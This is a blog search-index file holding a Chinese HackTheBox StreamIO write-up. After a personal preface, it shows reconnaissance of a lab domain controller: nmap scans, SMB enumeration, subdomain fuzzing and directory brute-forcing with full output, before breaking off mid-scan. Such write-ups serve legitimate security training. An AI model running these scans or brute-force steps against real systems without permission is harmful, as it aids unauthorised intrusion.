<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>test</title>
      <link href="/2024/01/09/test/"/>
      <url>/2024/01/09/test/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>123123</p><p>123123</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[hackthebox]StreamIO WriteUp</title>
      <link href="/2023/12/10/htbStreamIO/"/>
      <url>/2023/12/10/htbStreamIO/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在今年的9月底之前，我拿到了几家比较心仪的offer，互联网大厂安全岗和乙方安全岗皆有。回想自己今年下半年的生活，还是比较充实的。一边实习，一边准备秋招，一边又研究自己感兴趣的安全技术。在拿到了秋招offer的一个月后，我向实验室总监提交了离职申请。离职的最后一晚，我在望京SOHO转了一圈，忽然发现自己已经很舍不得这里了。</p><p><a href="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg"></a></p><p>我起初的想法是觉得回学校能够更轻松自由一点，想学什么就学什么。但是回到学校之后的一个多月里，我几乎天天都在摆烂，每天不是刷刷b站就是玩玩游戏，完全提不起学习的念头，之前想好的计划也全部落空。直到前些天，看到了Faker夺冠。</p><p>我大约是从S6开始关注英雄联盟赛事的。在我刚刚观看英雄联盟比赛的时候，Faker就已经是当之无愧的GOAT了。我对Faker最初的印象是觉得他个人实力很强，光是在中路站着就已经让人感觉脊背发凉了。但是我却并不是从S6，也就是Faker成为三冠王的时候开始喜欢Faker的。我最开始喜欢Faker的时候，是在去年全球总决赛半决赛，T1对阵JDG的时候。我记得当时是第四局，Faker操刀的沙皇在这一局里发挥非常亮眼。印象很深的一波是Faker在JDG蓝区果断闪现过墙赶路，然后大招推回两人，从那一刻起，这场比赛对于JDG来说已经渐渐走远了。但这一波也只能说明Faker是一个很果断、面对机会敢于大胆尝试的选手，真正让我感到动容的是在后面中路的一波团战，Faker漂移+大招推到敌方四个人的那一波。那一波打完之后，镜头给了Faker一个特写，我看到Faker满含笑意的眼睛里出现了一滴眼泪。</p><p><a href="https://pic.imgdb.cn/item/65760ea0c458853aef530ad8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ea0c458853aef530ad8.jpg"></a></p><p>那一刻，我深深地被Faker的个人魅力所折服。那个时候距离Faker第一次登上赛场已经过去很多年了，但是Faker对于英雄联盟的热爱却从未减弱。即使很多人觉得他已经老了，已经完全没有办法跟年轻人去拼操作了，但是他依然凭借自己的努力站在比赛的舞台上并打出出色的表现。因此即使去年T1决赛输给了DRX，我也并未对Faker的喜爱减少半分，因为我相信像他这样的人，是一定会再得到一个冠军的。</p><p>只是命运似乎总是喜欢捉弄人，它在让一个人成功之前，总是要先让这个人吃点苦头。在 T1 拿到了世界赛亚军之后，命运又送给了这支队伍两次亚军，T1也被戏称为大满亚队伍。在今年7月份的时候，Faker因为手伤折磨，下场休息了一个月。在这一个月的时间里，T1打了8个BO3只赢了1把。说实话，当时看到这个战绩的时候，我就对于今年T1能够再拿到一个冠军不再抱有任何信心了。但是Faker回来之后，又带领4个队友成功杀到夏季赛决赛，然后又拿了一个亚军……虽说与之前的战绩相比亚军也已经可以了，但是我也并不觉得今年Faker能够拿到冠军。因为去年一路所向披靡都没有拿到冠军，更何况今年呢？而世界赛初期T1的表现似乎也印证了我的想法，比如T1第一局对阵TL都差点翻车，碰到Geng又输了一局。然后我就是抱着这样看衰的心态，看着Faker带着4个队友一路过五关斩六将，以对位 LPL赛区 11-1的豪华战绩拿到了世界赛的冠军。</p><p>看到Faker拿到了他的第四冠，我是打心底里佩服和高兴的，但是高兴之余又会想到自己。这段时间我一直在问自己可不可以做到像Faker这样，对于自己热爱的事业数十年如一日的坚持下去。Faker从S6之后的故事似乎只是在告诉我们一件事，那就是用十年的时间坚持不懈的去做一件事，梦想才有可能成真。在明白了这一点之后，我开始打起精神。我希望自己可以做到像Faker那样，保持谦逊，并且对于自己热爱的事情可以全力以赴地去做。</p><p>因此最近我又有了学习的动力，这些天也是挑了一些HTB的靶机打了打，想让自己的手感恢复起来。接下来的文章就是对我在打StreamIO这台靶机的时候所想到的一些思路和采用的方法做一个记录，尽可能详细吧。</p><h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>因为靶场比较复杂，为了使得网络尽量稳定，我们在连接VPN的时候可以通过代理服务器连接。向.ovpn文件中添加如下配置：</p><p><a href="https://pic.imgdb.cn/item/65760eb0c458853aef5321be.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760eb0c458853aef5321be.jpg"></a></p><p>其中192.168.135.1是我的代理服务器的IP，7890是代理端口，你需要改成你自己的。另外OpenVPN的http-proxy必须使用TCP协议。通过代理连接VPN，速度还是比较快的：</p><p><a href="https://pic.imgdb.cn/item/65760ebac458853aef53343a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ebac458853aef53343a.jpg"></a></p><p>接下来开始打靶，首先执行<code>nmap -sT -p- --min-rate 5000 -oA nmapscan/ports 10.10.11.158</code>看看开放的端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Fri Dec  8 00:36:44 2023 as: nmap -sT -p- --min-rate 5000 -oA nmapscan/ports 10.10.11.158</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.158</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 65517 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">443/tcp   open  https</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49674/tcp open  unknown</span><br><span class="line">49705/tcp open  unknown</span><br><span class="line">51260/tcp open  unknown</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Fri Dec  8 00:38:18 2023 -- 1 IP address (1 host up) scanned in 93.30 seconds</span></span><br></pre></td></tr></table></figure><p>接下来进行详细端口扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p 53,80,88,135,139,389,443,445,464,593,636,5985,9389,49667,49673,49674,49705,51260 --min-rate 5000 -oA nmapscan/details 10.10.11.158</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.158</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-08 12:44:22Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)</span><br><span class="line">443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2023-12-08T12:46:06+00:00; +7h00m00s from scanner time.</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">| ssl-cert: Subject: commonName=streamIO/countryName=EU</span><br><span class="line">| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb</span><br><span class="line">| Not valid before: 2022-02-22T07:03:28</span><br><span class="line">|_Not valid after:  2022-03-24T07:03:28</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49674/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">51260/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019 (89%)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (89%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2023-12-08T12:45:31</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Fri Dec  8 00:46:13 2023 -- 1 IP address (1 host up) scanned in 119.55 seconds</span></span><br></pre></td></tr></table></figure><p>通过扫描信息，可以判断这是一台DC。接着将<code>streamio.htb</code>和<code>watch.streamio.htb</code>写入到hosts。因为开放了139和445端口，尝试smb匿名连接：</p><p><a href="https://pic.imgdb.cn/item/65760ec7c458853aef535078.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ec7c458853aef535078.jpg"></a></p><p>执行<code>crackmapexec smb 10.10.11.158</code>可以扫到一台机子，将<code>dc.streamio.htb</code>也添加进hosts：</p><p><a href="https://pic.imgdb.cn/item/65760ed3c458853aef536a2a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ed3c458853aef536a2a.jpg"></a></p><p>接下来就扫一下子域名吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H <span class="string">&quot;HOST: FUZZ.streamio.htb&quot;</span> -u https://streamio.htb/ --hw 24 --hc 400</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: https://streamio.htb/</span></span><br><span class="line"><span class="string">Total requests: 19966</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                                                                   </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000002268:   200        78 L     245 W      2829 Ch     &quot;watch - watch&quot;                                                                                                           </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 240.1962</span></span><br><span class="line"><span class="string">Processed Requests: 19966</span></span><br><span class="line"><span class="string">Filtered Requests: 19965</span></span><br><span class="line"><span class="string">Requests/sec.: 83.12368</span></span><br></pre></td></tr></table></figure><p>没有收获，只扫到一个已有的watch.streamio.htb。接下来我们访问一下这台主机部署的Web服务：</p><p><a href="https://pic.imgdb.cn/item/65760edec458853aef537a1d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760edec458853aef537a1d.jpg"></a></p><p>80端口是一个很普通的IIS Server的欢迎界面，没什么值得关注的点。接下来我们访问一下443端口，以下是<a href="https://streamio.htb的界面：">https://streamio.htb的界面：</a></p><p><a href="https://pic.imgdb.cn/item/65760eeac458853aef5388e3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760eeac458853aef5388e3.jpg"></a></p><p>尝试注册登录，显示注册成功，但是登录却登录不上，sqlmap扫了也没什么发现。对其他地方进行检查，也没有发现可疑的点。接下来看看<a href="https://watch.streamio.htb/%EF%BC%9A">https://watch.streamio.htb/：</a></p><p><a href="https://pic.imgdb.cn/item/65760ef4c458853aef539eff.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ef4c458853aef539eff.jpg"></a></p><p>分析之后没得到可以利用的点。那接下来就爆破一下目录吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k</span></span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.10.1</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ https://streamio.htb</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.10.1</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 💲  Extensions            │ [php]</span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔓  Insecure              │ <span class="literal">true</span></span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">301      GET        2l       10w      151c https://streamio.htb/images =&gt; https://streamio.htb/images/</span><br><span class="line">301      GET        2l       10w      150c https://streamio.htb/admin =&gt; https://streamio.htb/admin/</span><br><span class="line">301      GET        2l       10w      147c https://streamio.htb/js =&gt; https://streamio.htb/js/</span><br><span class="line">301      GET        2l       10w      148c https://streamio.htb/css =&gt; https://streamio.htb/css/</span><br><span class="line">200      GET        2l     1276w    88145c https://streamio.htb/js/jquery-3.4.1.min.js</span><br><span class="line">200      GET      231l      571w     7825c https://streamio.htb/about.php</span><br><span class="line">200      GET      192l     1006w    82931c https://streamio.htb/images/icon.png</span><br><span class="line">200      GET      395l      915w    13497c https://streamio.htb/index.php</span><br><span class="line">200      GET      101l      173w     1663c https://streamio.htb/css/responsive.css</span><br><span class="line">200      GET      111l      269w     4145c https://streamio.htb/login.php</span><br><span class="line">200      GET        5l      374w    21257c https://streamio.htb/js/popper.min.js</span><br><span class="line">200      GET       51l      213w    19329c https://streamio.htb/images/client.jpg</span><br><span class="line">200      GET      863l     1698w    16966c https://streamio.htb/css/style.css</span><br><span class="line">200      GET      206l      430w     6434c https://streamio.htb/contact.php</span><br><span class="line">200      GET      913l     5479w   420833c https://streamio.htb/images/about-img.png</span><br><span class="line">302      GET        0l        0w        0c https://streamio.htb/logout.php =&gt; https://streamio.htb/</span><br><span class="line">200      GET      367l     1995w   166220c https://streamio.htb/images/contact-img.png</span><br><span class="line">200      GET      395l      915w    13497c https://streamio.htb/</span><br><span class="line">200      GET      121l      291w     4500c https://streamio.htb/register.php</span><br><span class="line">200      GET      191l      253w     3120c https://streamio.htb/css/login.css</span><br><span class="line">301      GET        2l       10w      157c https://streamio.htb/admin/images =&gt; https://streamio.htb/admin/images/</span><br><span class="line">301      GET        2l       10w      154c https://streamio.htb/admin/css =&gt; https://streamio.htb/admin/css/</span><br><span class="line">301      GET        2l       10w      153c https://streamio.htb/admin/js =&gt; https://streamio.htb/admin/js/</span><br><span class="line">200      GET      274l     1677w   150222c https://streamio.htb/images/barry.png</span><br><span class="line">200      GET     2059l    12754w  1028337c https://streamio.htb/images/samantha.png</span><br><span class="line">200      GET     1753l    10007w   871140c https://streamio.htb/images/oliver.png</span><br><span class="line">301      GET        2l       10w      150c https://streamio.htb/fonts =&gt; https://streamio.htb/fonts/</span><br><span class="line">403      GET        1l        1w       18c https://streamio.htb/admin/index.php</span><br><span class="line">301      GET        2l       10w      156c https://streamio.htb/admin/fonts =&gt; https://streamio.htb/admin/fonts/</span><br><span class="line">200      GET        2l        6w       58c https://streamio.htb/admin/master.php</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/con</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/con</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/con</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/con</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/con</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/con</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/con</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/con</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/con</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/con</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/aux</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/aux</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/aux</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/aux</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/aux</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/aux</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/aux</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/aux</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/aux</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/aux</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/images/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/images/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/js/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/images/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/images/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/js/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/fonts/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/fonts/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/fonts/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/fonts/error%1F_log.php</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/prn</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/prn</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/prn</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/prn</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/prn</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/prn</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/prn</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/prn</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/prn</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/prn</span><br><span class="line">[<span class="comment">####################] - 13m   265889/265889  0s      found:80      errors:1      </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/images/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/js/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/css/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/images/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/css/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/js/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/fonts/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/fonts/</span></span><br></pre></td></tr></table></figure><p>发现一个&#x2F;admin的目录，直接访问显示forbidden：</p><p><a href="https://pic.imgdb.cn/item/65760f03c458853aef53bfaa.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f03c458853aef53bfaa.jpg"></a></p><p>发现爆破结果中还有一个<a href="https://streamio.htb/admin/master.php%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%8B%EF%BC%9A">https://streamio.htb/admin/master.php，访问一下：</a></p><p><a href="https://pic.imgdb.cn/item/65760f0cc458853aef53cb7a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f0cc458853aef53cb7a.jpg"></a></p><p>提示我们只能通过包含来访问，因此我们可以推断某个地方应该是存在LFI的。这个域名的其余目录没什么收获，接下来爆破一下watch.streamio.htb这个二级域名的目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 